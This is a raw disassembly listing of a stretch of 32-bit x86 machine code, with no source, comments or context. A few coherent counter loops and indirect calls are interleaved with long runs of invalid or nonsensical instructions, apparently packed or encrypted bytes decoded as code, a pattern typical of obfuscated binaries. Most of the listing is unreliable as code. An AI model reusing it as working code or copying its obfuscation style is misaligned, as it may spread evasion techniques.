  407425:	add    ebp,DWORD PTR [ecx+0x5f61a257]
  40742b:	mov    al,bl
  40742d:	cld    
  40742e:	(bad)  
  40742f:	out    dx,eax
  407430:	jno    0x4073b3
  407432:	jb     0x4073ff
  407434:	repz jmp 0x78b1:0x4cf5860c
  40743c:	mov    ds:0x7faf6030,eax
  407441:	dec    esp
  407442:	popf   
  407443:	imul   edi,DWORD PTR ds:0x7d8bd033,0xfffffff0
  40744a:	or     DWORD PTR ds:0x430357,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x4302c9,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x43034f,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [ebp+0x35bea2f1],cl
  407482:	lds    edi,FWORD PTR [esi+0x7e]
  407485:	mov    bh,BYTE PTR [edi+0x7e]
  407488:	jle    0x407454
  40748a:	and    cl,BYTE PTR [ebx-0x15]
  40748d:	shl    DWORD PTR [ebp+0x62],cl
  407490:	fs scas al,BYTE PTR es:[edi]
  407492:	cmp    BYTE PTR [edi+0xac7e29d],al
  407498:	adc    ch,BYTE PTR [ecx]
  40749a:	push   edx
  40749b:	adc    esi,ecx
  40749d:	mov    dl,BYTE PTR [eax+0x63]
  4074a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074a1:	push   cs
  4074a2:	xchg   esp,edx
  4074a4:	push   esi
  4074a5:	inc    ebp
  4074a6:	mov    ss,ecx
  4074a8:	ja     0x407483
  4074aa:	ret    
  4074ab:	mov    bl,0xa9
  4074ad:	clc    
  4074ae:	ins    DWORD PTR es:[edi],dx
  4074af:	loope  0x4074b3
  4074b1:	inc    esi
  4074b2:	in     al,dx
  4074b3:	add    DWORD PTR [eax-0x77],ebx
  4074b6:	repz sbb esi,edx
  4074b9:	adc    eax,0xe6fcff33
  4074be:	lea    edi,[edx+eax*1]
  4074c1:	mov    cl,0xc2
  4074c3:	add    BYTE PTR [ecx-0x62],0x2f
  4074c7:	or     edx,DWORD PTR [esi+0x1d]
  4074ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074cb:	sahf   
  4074cc:	daa    
  4074cd:	shl    BYTE PTR [esi-0x6a],cl
  4074d0:	xor    al,0xc3
  4074d2:	xchg   esi,eax
  4074d3:	pop    esp
  4074d4:	mov    edx,0x12bcdf27
  4074d9:	xor    eax,0x75c8197c
  4074de:	lods   eax,DWORD PTR ds:[esi]
  4074df:	mov    BYTE PTR [ecx+0x1a995a46],ch
  4074e5:	cmp    ch,BYTE PTR [esp+eiz*4]
  4074e8:	loopne 0x40747e
  4074ea:	scas   al,BYTE PTR es:[edi]
  4074eb:	xchg   ecx,eax
  4074ec:	dec    edi
  4074ed:	or     eax,0x14ea68bd
  4074f2:	rcr    BYTE PTR [edi+0x7e8217be],cl
  4074f8:	mov    ebp,0x42e16eab
  4074fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074fe:	xor    ch,cl
  407500:	aad    0x8e
  407502:	pop    bx
  407504:	xor    BYTE PTR [eax-0x3b],0xa8
  407508:	mov    ds:0x328cc8bf,al
  40750d:	mov    al,ds:0xf3bea334
  407512:	add    al,BYTE PTR ds:0xe8944a1
  407518:	push   esi
  407519:	sbb    ebx,DWORD PTR [ebp+ecx*8-0x5b]
  40751d:	aad    0x24
  40751f:	nop
  407520:	xor    al,0x85
  407522:	mov    esp,0xe9af7
  407527:	and    al,0x31
  407529:	aas    
  40752a:	imul   ecx,DWORD PTR [edx],0x1e6e9b2a
  407530:	or     DWORD PTR ds:[eax+edi*1],0xe9261d09
  407538:	fdivr  QWORD PTR [eax+eax*1+0x51f6406a]
  40753f:	lock cmp eax,0xe1b37f10
  407545:	xlat   BYTE PTR ds:[ebx]
  407546:	je     0x4075b9
  407548:	sbb    al,0x77
  40754a:	mov    WORD PTR [ecx-0x6b],ds
  40754d:	(bad)  
  40754e:	int3   
  40754f:	aaa    
  407550:	mov    dh,BYTE PTR [ebx+0x77]
  407553:	adc    eax,0x4f64a7d1
  407558:	mov    esi,0xf6ad1542
  40755d:	inc    ebx
  40755e:	adc    al,0x8a
  407560:	mov    eax,ds:0xb5ee26c9
  407565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407566:	push   ss
  407567:	xor    eax,DWORD PTR [esi-0x26fe16b2]
  40756d:	push   es
  40756e:	sbb    bl,cl
  407570:	inc    edi
  407571:	cmp    DWORD PTR [eax+0x2ee034e4],esi
  407577:	repz (bad)
  40757a:	and    eax,0xe23c666d
  40757f:	fnstenv [ebx-0x646547d8]
  407585:	fmulp  st(6),st
  407587:	ins    BYTE PTR es:[edi],dx
  407588:	xor    eax,0x1c53aa26
  40758d:	mov    ss,WORD PTR [eax]
  40758f:	(bad)  
  407590:	adc    BYTE PTR [esi+0x78ad9f76],al
  407596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407597:	inc    eax
  407598:	arpl   WORD PTR [ebx],di
  40759a:	add    BYTE PTR [ebp-0x1214866c],0xf
  4075a1:	mov    ecx,DWORD PTR [ebx]
  4075a3:	jae    0x4075ed
  4075a5:	mov    al,0x13
  4075a7:	mov    ebx,0x34f6576a
  4075ac:	adc    eax,0x8087aa
  4075b1:	sub    al,0xa7
  4075b3:	scas   al,BYTE PTR es:[edi]
  4075b4:	outs   dx,DWORD PTR ds:[esi]
  4075b5:	aam    0xd6
  4075b7:	pop    eax
  4075b8:	push   edi
  4075b9:	repz inc esp
  4075bb:	dec    ecx
  4075bc:	cmp    eax,0x6efad93f
  4075c1:	inc    esp
  4075c2:	xor    esp,ebp
  4075c4:	cmp    eax,0x8b7fefec
  4075c9:	mov    dl,0x18
  4075cb:	and    esi,DWORD PTR ds:0x7475d5c5
  4075d1:	mov    cl,0x2e
  4075d3:	sbb    eax,0xe65ad512
  4075d8:	xchg   edi,eax
  4075d9:	aas    
  4075da:	repz or ebp,DWORD PTR ds:0xf7362b31
  4075e1:	push   esi
  4075e2:	cmp    DWORD PTR [edx-0x1d],ebp
  4075e5:	mov    al,ds:0x52a17f58
  4075ea:	inc    esp
  4075eb:	clc    
  4075ec:	jno    0x4075f5
  4075ee:	add    eax,0x17616356
  4075f3:	adc    DWORD PTR [ebx],ecx
  4075f5:	cmp    edx,ecx
  4075f7:	or     cl,BYTE PTR [ecx]
  4075f9:	jle    0x40766b
  4075fb:	call   0xede9:0xd83b2bc6
  407602:	add    DWORD PTR [ecx-0x6],edi
  407605:	call   0xb2187dc2
  40760a:	xchg   edi,eax
  40760b:	pop    edi
  40760c:	jnp    0x40765b
  40760e:	push   ecx
  40760f:	push   ss
  407610:	(bad)  
  407611:	or     DWORD PTR [edi-0x3f],edi
  407614:	jb     0x407624
  407616:	in     al,0xbb
  407618:	loope  0x407606
  40761a:	jl     0x407670
  40761c:	or     BYTE PTR [edi],cl
  40761e:	test   bl,ch
  407620:	sbb    al,BYTE PTR [eax]
  407622:	add    BYTE PTR [ebx-0x17],dl
  407625:	pop    esi
  407626:	pop    ss
  407627:	add    BYTE PTR [eax],al
  407629:	and    DWORD PTR ds:0x42ec4b,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42ec4b
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42ec4b,edx
  407647:	cmp    DWORD PTR ds:0x42ec4b,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42ec4b,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42e933
  40766a:	cmp    DWORD PTR ds:0x42ec4b,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42ec4b
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42ec4b,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	ins    DWORD PTR es:[edi],dx
  4076a5:	fldenv ds:[ecx+0x7e7ec241]
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x407648
  4076b1:	mov    ebx,0xaafb7158
  4076b6:	cmp    esp,esp
  4076b8:	or     ecx,DWORD PTR [edx+0x59839d10]
  4076be:	aad    0x5d
  4076c0:	cdq    
  4076c1:	lds    edi,FWORD PTR [edx]
  4076c3:	push   0x29
  4076c5:	icebp  
  4076c6:	push   ss
  4076c7:	icebp  
  4076c8:	(bad)  
  4076c9:	xor    BYTE PTR [ebp+0x5fc01e70],ch
  4076cf:	mov    edx,DWORD PTR ds:0x1436bfa
  4076d5:	fistp  DWORD PTR [ecx-0x2475371f]
  4076db:	and    bh,cl
  4076dd:	cmp    al,0xc8
  4076df:	pop    es
  4076e0:	addr16 inc esp
  4076e2:	in     eax,0xe
  4076e4:	shl    ebx,1
  4076e6:	jmp    0x407684
  4076e8:	sub    edx,eax
  4076ea:	sbb    DWORD PTR [ebp+ebx*1+0x122b6221],edi
  4076f1:	je     0x407710
  4076f3:	int    0xb5
  4076f5:	adc    BYTE PTR [edi-0x159c2a8c],al
  4076fb:	rcr    eax,0xe8
  4076fe:	sbb    DWORD PTR [edi+0x2],0x1620cc23
  407705:	jmp    0x40775d
  407707:	test   DWORD PTR [edx+eiz*2+0x61],eax
  40770b:	jb     0x4076df
  40770d:	pop    ds
  40770e:	stc    
  40770f:	in     eax,0x87
  407711:	sub    edx,esi
  407713:	(bad)  
  407715:	pop    ebp
  407716:	mov    cl,0x13
  407718:	std    
  407719:	out    0x3a,al
  40771b:	or     BYTE PTR [ecx],ah
  40771d:	cmc    
  40771e:	push   ds
  40771f:	inc    eax
  407720:	daa    
  407721:	pushf  
  407722:	ret    0xabbc
  407725:	push   eax
  407726:	dec    edx
  407727:	dec    eax
  407728:	inc    ecx
  407729:	imul   esp,eax,0xffffffa8
  40772c:	push   edi
  40772d:	mov    eax,0xabe40e44
  407732:	ficom  DWORD PTR [ebx+0x2a40553e]
  407738:	push   ss
  407739:	or     al,0x4d
  40773b:	push   edx
  40773c:	add    al,0x9b
  40773e:	ins    DWORD PTR es:[edi],dx
  40773f:	xchg   esp,eax
  407740:	lods   eax,DWORD PTR ds:[esi]
  407741:	adc    al,0x61
  407743:	mov    dl,0x6
  407745:	push   cs
  407746:	xchg   BYTE PTR [ebx-0x893841d],dh
  40774c:	adc    BYTE PTR [edi+eax*4-0x44fa15ff],bl
  407753:	clc    
  407754:	in     eax,0x78
  407756:	inc    eax
  407757:	add    DWORD PTR [edi-0x31392013],edi
  40775d:	cmp    DWORD PTR [ebx+0x5897aaf2],ebp
  407763:	jl     0x40773d
  407765:	je     0x40771f
  407767:	pop    eax
  407768:	nop
  407769:	dec    esi
  40776a:	sub    eax,0x511015bd
  40776f:	es pop es
  407771:	jle    0x4077c1
  407773:	or     bh,bl
  407775:	loop   0x4077c7
  407777:	inc    ecx
  407778:	mov    WORD PTR [edx-0x61],fs
  40777b:	add    DWORD PTR [edi+0x12],ebx
  40777e:	xchg   edi,eax
  40777f:	or     DWORD PTR [esi+0x382b825f],ecx
  407785:	add    BYTE PTR [edi],cl
  407787:	mov    cl,0xb9
  407789:	sbb    BYTE PTR [eax+0x7],bh
  40778c:	jns    0x4077eb
  40778e:	sti    
  40778f:	loopne 0x407784
  407791:	mov    ch,0xa2
  407793:	sub    eax,0x186dfaa9
  407798:	and    eax,0xadc9e385
  40779d:	or     esi,DWORD PTR [esi-0x31a39c72]
  4077a3:	push   es
  4077a4:	hlt    
  4077a5:	pop    eax
  4077a6:	test   al,0x85
  4077a8:	sbb    DWORD PTR [ebp-0x5e39aec1],0x735b9838
  4077b2:	jle    0x407751
  4077b4:	out    dx,eax
  4077b5:	inc    esp
  4077b6:	ss xchg ebp,eax
  4077b8:	jmp    0x407749
  4077ba:	hlt    
  4077bb:	out    0x9e,eax
  4077bd:	push   ebx
  4077be:	aad    0x35
  4077c0:	or     ebp,DWORD PTR [esi-0x467c4e14]
  4077c6:	jbe    0x4077ee
  4077c8:	dec    esp
  4077c9:	push   0xa51bec0d
  4077ce:	cdq    
  4077cf:	fwait
  4077d0:	data16 out dx,al
  4077d2:	fcom   QWORD PTR [ebp+eiz*1-0x32028232]
  4077d9:	in     al,0xde
  4077db:	jb     0x4077b4
  4077dd:	mul    BYTE PTR [eax+0xa8d1ec6]
  4077e3:	adc    eax,DWORD PTR [eax]
  4077e5:	and    edx,DWORD PTR [esi+0x564cace9]
  4077eb:	jl     0x407825
  4077ed:	fiadd  DWORD PTR [eax+0x2b]
  4077f0:	mov    ebp,DWORD PTR [ebp+0x61]
  4077f3:	mov    eax,?
  4077f5:	cs (bad) 
  4077f7:	push   eax
  4077f8:	or     BYTE PTR [ebx],ah
  4077fa:	dec    edx
  4077fb:	fistp  WORD PTR [edx-0xc26af23]
  407801:	icebp  
  407802:	push   0xa9f457bf
  407807:	in     al,dx
  407808:	mov    eax,0xc205b74a
  40780d:	push   eax
  40780e:	icebp  
  40780f:	neg    BYTE PTR [edi]
  407811:	ins    BYTE PTR es:[edi],dx
  407812:	push   ss
  407813:	jns    0x407815
  407815:	and    al,0x41
  407817:	mov    ds:0xef0dcd24,eax
  40781c:	xor    DWORD PTR [edx+ebx*1],edi
  40781f:	cmp    al,0x24
  407821:	push   edi
  407822:	push   0x3d
  407824:	push   edx
  407825:	mov    ebp,ecx
  407827:	jmp    0x407839
  407829:	jns    0x4077e5
  40782b:	in     eax,dx
  40782c:	jmp    0x407851
  40782e:	inc    eax
  40782f:	mov    edi,0x2b37d286
  407834:	push   ebp
  407835:	mov    eax,ds:0xb287393a
  40783a:	imul   esi,DWORD PTR [ebx-0x376e17e5],0xceefae7b
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x4302c9,0x43034f
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x4302ed,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e644,0x1e
  407871:	cmp    DWORD PTR ds:0x42e644,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e644,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42e937
  407896:	mov    edi,DWORD PTR ds:0x42e644
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e644,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42ec4f
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x4302bd,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x4302bd
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x4302bd,ebx
  4078d6:	cmp    DWORD PTR ds:0x4302bd,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eaa7
  4078f1:	cmp    DWORD PTR ds:0x4302bd,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	(bad)  
  407942:	out    dx,eax
  407943:	push   0x5f
  407945:	sbb    ch,0xc0
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x407927
  40794f:	mov    ebp,0xe5bbfa1a
  407954:	test   DWORD PTR [edi-0x5768db55],eax
  40795a:	xchg   edx,esi
  40795c:	add    bl,BYTE PTR [ecx+0x48]
  40795f:	jp     0x4079b4
  407961:	call   0xe4cc:0x7f0e7799
  407968:	pop    esi
  407969:	inc    eax
  40796a:	mov    ch,0xc9
  40796c:	lahf   
  40796d:	scas   al,BYTE PTR es:[edi]
  40796e:	cdq    
  40796f:	mov    esp,0xec47d495
  407974:	fild   WORD PTR [esi+0x42]
  407977:	xor    ch,BYTE PTR [ebx-0x24]
  40797a:	retf   
  40797b:	mov    gs,eax
  40797d:	jl     0x407923
  40797f:	je     0x40792b
  407981:	pop    es
  407982:	lds    eax,FWORD PTR [edx+0x6893c758]
  407988:	jo     0x407935
  40798a:	shl    BYTE PTR [edi-0x481f0d75],cl
  407990:	jmp    0x1133:0xa90fcb97
  407997:	sar    DWORD PTR [edx+0x5b18839b],cl
  40799d:	inc    eax
  40799e:	jmp    0x407966
  4079a0:	xchg   esp,eax
  4079a1:	sbb    bh,BYTE PTR [ebp-0x34]
  4079a4:	xchg   ecx,eax
  4079a5:	dec    edi
  4079a6:	sbb    al,0xad
  4079a8:	and    BYTE PTR [eax+eiz*2],cl
  4079ab:	jne    0x407998
  4079ad:	sub    ebp,DWORD PTR [ebx+0x43]
  4079b0:	loope  0x4079ba
  4079b2:	rol    BYTE PTR [ebx+0x1635b15c],1
  4079b8:	ss int3 
  4079ba:	shl    DWORD PTR [eax],0x66
  4079bd:	loop   0x4079fa
  4079bf:	mov    ecx,0x6ef00d55
  4079c4:	sti    
  4079c5:	adc    DWORD PTR [esp+esi*1],edx
  4079c8:	in     eax,0x27
  4079ca:	rol    ch,0xbc
  4079cd:	nop
  4079ce:	adc    al,0xa4
  4079d0:	cmp    eax,0xc1139298
  4079d5:	dec    eax
  4079d6:	fst    DWORD PTR [ebp+0x2d]
  4079d9:	ficom  WORD PTR [esi+eax*2]
  4079dc:	push   cs
  4079dd:	stc    
  4079de:	mov    ecx,0x967a6de
  4079e3:	sbb    eax,0x841d9c28
  4079e8:	lahf   
  4079e9:	push   esi
  4079ea:	lods   eax,DWORD PTR ds:[esi]
  4079eb:	ret    0x8873
  4079ee:	inc    eax
  4079ef:	mov    edi,0x30816091
  4079f4:	jecxz  0x407a0d
  4079f6:	aaa    
  4079f7:	pusha  
  4079f8:	mov    esp,0x7340eb20
  4079fd:	or     esp,DWORD PTR [edx+0xc]
  407a00:	test   bl,ah
  407a02:	inc    edx
  407a03:	lods   al,BYTE PTR ds:[esi]
  407a04:	cs jb  0x407a86
  407a07:	(bad)  
  407a08:	(bad)  
  407a09:	pusha  
  407a0a:	aad    0xca
  407a0c:	repnz addr16 fstp st(4)
  407a11:	push   0xffffffc8
  407a13:	(bad)  
  407a14:	cwde   
  407a15:	not    dl
  407a17:	lea    esi,[esi-0x55]
  407a1a:	push   edx
  407a1b:	pop    eax
  407a1c:	mov    edi,0xbb3d4575
  407a21:	sub    BYTE PTR [eax+0x3d3cd77e],bl
  407a27:	pop    eax
  407a28:	call   0x7e2d9f48
  407a2d:	or     al,0xf4
  407a2f:	dec    edi
  407a30:	daa    
  407a31:	inc    ebp
  407a32:	sub    eax,0xafa75c4
  407a38:	clc    
  407a39:	or     al,0xc6
  407a3b:	lar    edx,ax
  407a3e:	sar    DWORD PTR [edx],0x6a
  407a41:	cli    
  407a42:	add    DWORD PTR [esp+eiz*2],edx
  407a45:	mov    dl,0xf8
  407a47:	and    BYTE PTR [esi+0x239890b3],bh
  407a4d:	sbb    cl,BYTE PTR [ecx+0x62]
  407a50:	xor    cl,ah
  407a52:	popf   
  407a53:	mov    ds:0x6230e4f0,al
  407a58:	or     edi,edx
  407a5a:	ins    BYTE PTR es:[edi],dx
  407a5b:	cmp    ebx,DWORD PTR [ecx-0x6d9591c8]
  407a61:	and    al,bl
  407a63:	and    eax,0x5cab37ab
  407a68:	(bad)  
  407a69:	dec    ebx
  407a6a:	jb     0x407a1f
  407a6c:	adc    eax,0x8df6db1e
  407a71:	nop
  407a72:	ss inc eax
  407a74:	and    DWORD PTR [eax+eiz*8-0x79],edx
  407a78:	jbe    0x407a1f
  407a7a:	sub    dh,ch
  407a7c:	jle    0x407a69
  407a7e:	mov    eax,0x4a8e3ff3
  407a83:	stos   BYTE PTR es:[edi],al
  407a84:	fwait
  407a85:	bound  esp,QWORD PTR [edx-0x5f74d61f]
  407a8b:	pop    esi
  407a8c:	sub    BYTE PTR [eax-0x13bec77e],dh
  407a92:	pop    esp
  407a93:	jp     0x407a29
  407a95:	out    0xf9,al
  407a97:	jp     0x407aa5
  407a99:	sti    
  407a9a:	push   edx
  407a9b:	push   edx
  407a9c:	retf   0x34e0
  407a9f:	mov    dl,0x4
  407aa1:	mov    ds:0xd28e8c05,al
  407aa6:	mov    edi,DWORD PTR ds:0xabf17482
  407aac:	fistp  QWORD PTR [ebx+edi*2-0x9]
  407ab0:	push   0xa72cf082
  407ab5:	nop
  407ab6:	fild   WORD PTR [edi-0x3b]
  407ab9:	ss jno 0x407ab1
  407abc:	mov    edi,0x4a9ee9ab
  407ac1:	call   0x3c5d:0xcdf11e61
  407ac8:	(bad)  [edi-0x50483a44]
  407ace:	std    
  407acf:	fbstp  TBYTE PTR [edi]
  407ad1:	mov    ebp,0x656fd0a
  407ad6:	xchg   edx,eax
  407ad7:	mov    al,0xc1
  407ad9:	into   
  407ada:	das    
  407adb:	adc    eax,0xc509e738
  407ae0:	xor    DWORD PTR [ebx+0x2bf05d8b],0xfda3bdf
  407aea:	xchg   DWORD PTR [eax],ecx
  407aec:	add    BYTE PTR [eax],al
  407aee:	add    BYTE PTR [ebx+0x79e9d855],cl
  407af4:	or     al,0x0
  407af6:	add    BYTE PTR [ebx+0x7d8bd055],cl
  407afc:	cld    
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi+0x64587ca]
  407b11:	sub    ch,BYTE PTR [ecx-0x3f]
  407b14:	jle    0x407b94
  407b16:	mov    bh,BYTE PTR [edi+0x7e]
  407b19:	jle    0x407b82
  407b1b:	mov    BYTE PTR ds:0x4955eaf8,dl
  407b21:	push   edi
  407b22:	into   
  407b23:	push   edx
  407b24:	icebp  
  407b25:	(bad)  
  407b26:	pop    ebx
  407b27:	inc    ebp
  407b28:	inc    ebp
  407b29:	inc    esp
  407b2a:	mov    ecx,DWORD PTR [eax+ebp*1-0x59]
  407b2e:	fcom   DWORD PTR [eax+0x33]
  407b31:	dec    ebx
  407b32:	in     eax,dx
  407b33:	fwait
  407b34:	test   BYTE PTR [edi],ah
  407b36:	call   0xa077:0x54ab2a82
  407b3d:	mov    eax,ds:0x4d759b63
  407b42:	pop    ecx
  407b43:	in     al,dx
  407b44:	hlt    
  407b45:	repz test DWORD PTR [eax+0x7],ecx
  407b49:	mov    al,ds:0xd9012681
  407b4e:	cmp    edx,DWORD PTR [esi+0x4325cb69]
  407b54:	loop   0x407b2d
  407b56:	push   esp
  407b57:	mov    ch,0x74
  407b59:	sub    esi,DWORD PTR [ecx+eiz*2+0x5ba00f28]
  407b60:	out    0xaf,al
  407b62:	pop    es
  407b63:	xor    BYTE PTR [edi+0x34],dh
  407b66:	test   eax,0x70ca3484
  407b6b:	cld    
  407b6c:	pop    es
  407b6d:	ins    BYTE PTR es:[edi],dx
  407b6e:	push   ebx
  407b6f:	lds    eax,FWORD PTR [esi+edi*4]
  407b72:	inc    ecx
  407b73:	adc    eax,0x8c67a5ed
  407b78:	dec    eax
  407b79:	inc    ebp
  407b7a:	dec    eax
  407b7b:	in     eax,dx
  407b7c:	ret    
  407b7d:	outs   dx,DWORD PTR ds:[esi]
  407b7e:	popa   
  407b7f:	add    bl,BYTE PTR [edi]
  407b81:	mov    WORD PTR [edi-0x19931f7d],ss
  407b87:	pop    esi
  407b88:	sbb    BYTE PTR [esi+0x7c],bh
  407b8b:	(bad)  
  407b8d:	aad    0xaf
  407b8f:	ss int 0x22
  407b92:	dec    ebx
  407b93:	and    cl,BYTE PTR [bp+di-0x74cd]
  407b98:	fiadd  WORD PTR [esi-0x4e88f3c6]
  407b9e:	scas   eax,DWORD PTR es:[edi]
  407b9f:	or     bh,cl
  407ba1:	inc    edx
  407ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ba3:	scas   al,BYTE PTR es:[edi]
  407ba4:	inc    ecx
  407ba5:	loop   0x407bff
  407ba7:	cld    
  407ba8:	mov    bx,0xe98a
  407bac:	ins    BYTE PTR es:[edi],dx
  407bad:	test   BYTE PTR [eax-0x4f],cl
  407bb0:	jecxz  0x407bf3
  407bb2:	and    BYTE PTR [eax-0x1cb631a5],ah
  407bb8:	dec    eax
  407bb9:	dec    eax
  407bba:	xor    ebx,ecx
  407bbc:	pop    es
  407bbd:	mov    ebp,0x85c53b7c
  407bc2:	or     eax,0x452b722
  407bc7:	(bad)  
  407bc8:	push   es
  407bc9:	xchg   edi,eax
  407bca:	jne    0x407b77
  407bcc:	fmul   QWORD PTR [ecx]
  407bce:	scas   eax,DWORD PTR es:[edi]
  407bcf:	arpl   WORD PTR [ebp+0x22],sp
  407bd2:	push   edi
  407bd3:	fcomp  DWORD PTR [esi]
  407bd5:	mov    edi,0x9fbaa94b
  407bda:	mov    ecx,0xfb8b12d
  407bdf:	(bad)  
  407be0:	jmp    0xba835c9d
  407be5:	out    0x3c,eax
  407be7:	inc    edi
  407be8:	les    eax,FWORD PTR [edi-0x433dd0d2]
  407bee:	pop    esi
  407bef:	adc    eax,0x161ab1ea
  407bf4:	div    esi
  407bf6:	xchg   esi,eax
  407bf7:	int3   
  407bf8:	push   esp
  407bf9:	dec    ecx
  407bfa:	jb     0x407c57
  407bfc:	inc    ebp
  407bfd:	cmp    DWORD PTR [edx+0x1d],eax
  407c00:	inc    eax
  407c01:	mov    esp,0xc4a8fbd9
  407c06:	push   es
  407c07:	push   cs
  407c08:	bnd je 0x407c60
  407c0b:	je     0x407bce
  407c0d:	add    DWORD PTR [eax-0x29a5e8c8],edx
  407c13:	shl    DWORD PTR [esi],0xf5
  407c16:	or     DWORD PTR [ecx+0x38632e3c],edx
  407c1c:	dec    ebp
  407c1d:	dec    esi
  407c1e:	jo     0x407c12
  407c20:	and    edx,0xc9682889
  407c26:	mov    ebp,0x72289037
  407c2b:	xor    esp,esp
  407c2d:	mov    ?,WORD PTR [ebp-0x633484e3]
  407c33:	jl     0x407c8f
  407c35:	shl    DWORD PTR [edx],0x3d
  407c38:	and    al,0x46
  407c3a:	dec    eax
  407c3b:	fisubr DWORD PTR [esp+edi*1+0x5c]
  407c3f:	sbb    dl,bh
  407c41:	adc    esi,eax
  407c43:	sar    DWORD PTR fs:[eax+0x146ad57e],1
  407c4a:	mov    ds:0xe2bcc522,eax
  407c4f:	dec    ebx
  407c50:	repz cmp al,BYTE PTR [edi]
  407c53:	adc    eax,0x24305ad0
  407c58:	jl     0x407c4d
  407c5a:	mov    BYTE PTR [eax+0x718db8e1],dh
  407c60:	push   edi
  407c61:	out    dx,al
  407c62:	(bad)  
  407c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c64:	aad    0x4e
  407c66:	adc    DWORD PTR ds:0xad0cbaf8,ecx
  407c6c:	jo     0x407c0b
  407c6e:	and    edx,DWORD PTR [esi-0x37]
  407c71:	cmp    esi,DWORD PTR [ecx+0x1c2e58cf]
  407c77:	add    al,0x74
  407c79:	pop    ebx
  407c7a:	nop
  407c7b:	fwait
  407c7c:	or     BYTE PTR [esi],cl
  407c7e:	loop   0x407c1d
  407c80:	rcr    DWORD PTR [edi-0x4a],0x4e
  407c84:	test   eax,0x3c98f3ff
  407c89:	push   cs
  407c8a:	sti    
  407c8b:	cmc    
  407c8c:	xlat   BYTE PTR ds:[ebx]
  407c8d:	repz fstp DWORD PTR [esi]
  407c90:	call   0x92de:0xb884b3a8
  407c97:	jl     0x407d13
  407c99:	push   esi
  407c9a:	fbld   TBYTE PTR [ecx-0x7e]
  407c9d:	add    eax,ebp
  407c9f:	aad    0x16
  407ca1:	loope  0x407c8d
  407ca3:	cmp    ecx,DWORD PTR [esi+0x9]
  407ca6:	push   bx
  407ca8:	fcom   QWORD PTR [edi+ecx*2-0x7b]
  407cac:	rcr    DWORD PTR [edx],0x33
  407caf:	shl    BYTE PTR [ebx],1
  407cb1:	clc    
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
